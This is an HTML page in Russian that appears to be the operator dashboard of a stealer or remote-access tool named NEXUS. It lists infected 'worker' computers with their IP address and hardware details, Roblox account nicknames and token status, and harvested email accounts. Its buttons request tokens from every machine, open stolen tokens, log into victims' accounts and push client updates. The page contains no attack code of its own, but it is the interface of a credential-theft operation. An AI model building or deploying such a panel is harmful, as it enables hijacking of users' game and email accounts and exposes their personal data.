<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>NEXUS — Панель управления</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="assets/style.css?v=239">
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
</head>
<body>
  <div class="sidebar-layout">
    <div id="sidebarSlot"></div>
    
    <main class="main-content">
      <!-- Top Bar -->
      <div class="top-bar">
        <div>
          <h1 class="page-title">Воркеры и сессии</h1>
        </div>

        <div class="status-indicator" id="workerStatusIndicator" style="display: none;">
          <span class="dot"></span>
          <span>Воркеры онлайн</span>
        </div>
      </div>

      <!-- KPI Stats Grid -->
      <div class="stats-bar">
        <div class="stat-card">
          <div class="stat-label">Roblox Аккаунтов</div>
          <div class="stat-value" id="sRoblox">—</div>
        </div>

        <div class="stat-card">
          <div class="stat-label">Компьютеров</div>
          <div class="stat-value" id="sPCs">—</div>
        </div>

        <div class="stat-card">
          <div class="stat-label">Последняя активность</div>
          <div class="stat-value" id="sLast" style="font-size: 1.1rem; line-height: 1.4; color: var(--text-secondary);">—</div>
        </div>

        <div class="stat-card action-card" id="updateAllCard">
          <div class="stat-label" id="updateAllLabel">Обновление</div>
          <div style="display: flex; align-items: baseline; gap: 6px; margin: 0.2rem 0;">
            <span class="stat-value" id="updateAllCount">0</span>
            <span style="font-size: 0.85rem; color: var(--text-muted);" id="updateAllUnit">ПК</span>
          </div>
          <div id="updateAllSubtext" style="font-size: 0.75rem; color: var(--text-muted);">
            Нажмите для обновления
          </div>
        </div>
      </div>

      <!-- Search & Filters Control Bar -->
      <div class="controls-panel">
        <div class="search-bar-wrapper">
          <div style="position: relative; width: 100%;">
            <input 
              type="text" 
              class="search-input" 
              id="searchBar" 
              placeholder="Поиск по имени ПК или файлу..." 
              oninput="filterFiles()"
            >
          </div>

          <select class="filter-select" id="sortFiles" onchange="filterFiles()">
            <option value="date">По дате (новые)</option>
            <option value="roblox">Сначала с токеном</option>
            <option value="version">По версии</option>
          </select>
        </div>

        <div style="display: flex; gap: 8px;">
          <button class="btn-refresh" onclick="loadFiles()">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2"/></svg>
            <span>Обновить</span>
          </button>
          
          <button class="btn-secondary" id="btnRequestAll">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M17 8l-5-5-5 5M12 3v12"/></svg>
            <span>Запросить у всех</span>
          </button>
        </div>
      </div>

      <!-- File Grid -->
      <main class="files-grid" id="fileGrid">
        <div class="skeleton" style="height: 200px;"></div>
        <div class="skeleton" style="height: 200px;"></div>
        <div class="skeleton" style="height: 200px;"></div>
        <div class="skeleton" style="height: 200px;"></div>
      </main>
    </main>
  </div>

  <!-- Details Modal -->
  <div id="fileModal" class="modal-overlay" onclick="closeModal()">
    <div class="modal-container" onclick="event.stopPropagation()">
      <button class="modal-close" onclick="closeModal()" aria-label="Закрыть">✕</button>
      
      <div class="modal-content-wrapper" style="padding: 1.75rem; overflow-y: auto;">
        <h3 class="modal-filename" id="modalFilename">Название файла</h3>
        
        <div style="display: flex; gap: 1.25rem; flex-wrap: wrap; margin-top: 1.25rem;">
          
          <!-- Left: Hardware Telemetry -->
          <div class="modal-details-pane">
            <div class="specs-section">
              <h4 class="section-title">Характеристики системы</h4>
              <div class="specs-grid">
                <div class="spec-row"><span class="spec-lbl">Компьютер</span><span class="spec-val" id="specName">—</span></div>
                <div class="spec-row"><span class="spec-lbl">Версия</span><span class="spec-val" id="specVersion">—</span></div>
                <div class="spec-row"><span class="spec-lbl">IP-адрес</span><span class="spec-val" id="specIp">—</span></div>
                <div class="spec-row"><span class="spec-lbl">ОС</span><span class="spec-val" id="specOs">—</span></div>
                <div class="spec-row"><span class="spec-lbl">CPU</span><span class="spec-val" id="specCpu">—</span></div>
                <div class="spec-row"><span class="spec-lbl">RAM</span><span class="spec-val" id="specRam">—</span></div>
                <div class="spec-row"><span class="spec-lbl">GPU</span><span class="spec-val" id="specGpu">—</span></div>
                <div class="spec-row"><span class="spec-lbl">Дата</span><span class="spec-val" id="specDate">—</span></div>
              </div>
            </div>
          </div>
          
          <!-- Right: Roblox Account Info & Actions -->
          <div class="modal-roblox-pane">
            <div class="specs-section" id="robloxSpecsSection">
              <h4 class="section-title">Roblox Аккаунт</h4>
              <div class="specs-grid">
                <div class="spec-row">
                  <span class="spec-lbl">Никнейм</span>
                  <span class="spec-val" id="robloxSpecUser" style="color: var(--success); font-weight: 600;">—</span>
                </div>
                <div class="spec-row" id="tokenStatusRow" style="display:none;">
                  <span class="spec-lbl">Статус</span>
                  <span class="spec-val" id="tokenStatusText" style="color: var(--danger); font-weight: 500;">—</span>
                </div>
                <div class="spec-row" id="tokenRequestRow">
                  <span class="spec-lbl">Запрос токена</span>
                  <span class="spec-val" id="tokenRequestStatus">—</span>
                </div>
              </div>
            </div>

            <div class="specs-section" id="emailsSection" style="display:none;">
              <h4 class="section-title">Почтовые аккаунты</h4>
              <div id="emailsList" style="max-height:140px; overflow-y:auto; display:flex; flex-direction:column; gap:4px; margin-top:4px;"></div>
            </div>

            <div class="modal-actions">
              <button class="modal-btn" id="modalOpenBtn" style="background:#18181c; color:#fff; border:1px solid var(--border);">
                Открыть токены
              </button>
              <button class="modal-btn" id="modalLoginBtn" style="background:var(--success-bg); color:var(--success); border:1px solid var(--success-border);">
                Войти в аккаунт
              </button>
              <button class="modal-btn" id="modalRequestBtn" style="background:#18181c; color:var(--text-secondary); border:1px solid var(--border);">
                Запросить токен
              </button>
              <button class="modal-btn" id="modalUpdateBtn" style="background:#18181c; color:var(--text-secondary); border:1px solid var(--border);">
                Обновить клиент
              </button>
              <button class="modal-btn" id="modalEmailsBtn" style="background:#18181c; color:var(--text-secondary); border:1px solid var(--border);">
                Почты
              </button>
              <button class="modal-btn del-btn" id="modalDeleteBtn">
                Удалить
              </button>
            </div>

          </div>

        </div>
      </div>
    </div>
  </div>

  <div id="toast"></div>

  <!-- Global Keyboard Shortcut: '/' or 'Ctrl+K' to focus search -->
  <script>
    window.addEventListener('keydown', function(e) {
      if ((e.key === '/' || (e.ctrlKey && e.key === 'k')) && document.activeElement.tagName !== 'INPUT') {
        e.preventDefault();
        const s = document.getElementById('searchBar');
        if (s) { s.focus(); s.select(); }
      }
    });
  </script>

  <script src="assets/config.js?v=236"></script>
  <script src="assets/app.js?v=239"></script>
  <script src="assets/dashboard.js?v=236"></script>
</body>
</html>
